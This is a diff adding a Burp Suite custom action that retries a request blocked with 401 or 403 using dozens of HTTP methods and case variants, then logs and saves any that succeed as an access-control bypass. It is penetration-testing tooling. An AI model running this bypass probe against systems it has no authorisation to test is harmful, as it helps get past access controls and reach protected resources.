@@ -1,0 +1,68 @@
+id: b089c2e1-45f8-4b7b-9c6d-bypass-verb-001
+name: 403/401 Bypass - HTTP Verb Tampering
+function: CUSTOM_ACTION
+location: REPEATER
+source: |+
+  // 403/401 Bypass - HTTP Verb/Method Tampering
+  // Tests bypass using different HTTP methods including case variations
+  
+  int DELAY_MS = 50;
+  boolean VERBOSE = true;
+  
+  String[] HTTP_METHODS = {
+      "GET", "HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE",
+      "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK",
+      "UNLOCK", "VERSION-CONTROL", "REPORT", "CHECKOUT", "CHECKIN",
+      "UNCHECKOUT", "MKWORKSPACE", "UPDATE", "LABEL", "MERGE",
+      "BASELINE-CONTROL", "MKACTIVITY", "ORDERPATCH", "ACL", "SEARCH",
+      "ARBITRARY", "POUET", "FOOBAR", "CATS",
+      // Case variations
+      "GeT", "gEt", "gET", "GEt", "Get", "geT",
+      "PoSt", "pOsT", "pOST", "POsT", "POSt", "PosT",
+      "HeAd", "hEaD", "OpTiOnS", "DeLeTe", "PaTcH"
+  };
+  
+  var originalRequest = requestResponse.request();
+  var httpService = requestResponse.httpService();
+  var originalMethod = originalRequest.method();
+  int originalStatus = requestResponse.response().statusCode();
+  
+  logging.logToOutput("=== 403/401 Bypass - HTTP Verb Tampering ===");
+  logging.logToOutput("Target: " + httpService.host() + originalRequest.path());
+  logging.logToOutput("Original Method: " + originalMethod);
+  logging.logToOutput("Original Status: " + originalStatus);
+  logging.logToOutput("");
+  
+  int total = 0, success = 0;
+  
+  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
+      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);
+  
+  for (String method : HTTP_METHODS) {
+      if (method.equalsIgnoreCase(originalMethod)) continue;
+      
+      try {
+          var req = originalRequest.withMethod(method);
+          var resp = api.http().sendRequest(req);
+          Thread.sleep(DELAY_MS);
+          
+          int status = resp.response().statusCode();
+          String note = method + " -> " + status;
+          
+          if (isSuccess.test(originalStatus, status)) {
+              success++;
+              logging.logToOutput("[+] SUCCESS: " + note);
+              var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
+              rr.annotations().setNotes("Verb Tampering Bypass: " + note);
+              api.organizer().sendToOrganizer(rr);
+          } else if (VERBOSE) {
+              logging.logToOutput("[-] " + note);
+          }
+          total++;
+      } catch (Exception e) {
+          logging.logToError("Error: " + e.getMessage());
+      }
+  }
+  
+  logging.logToOutput("");
+  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
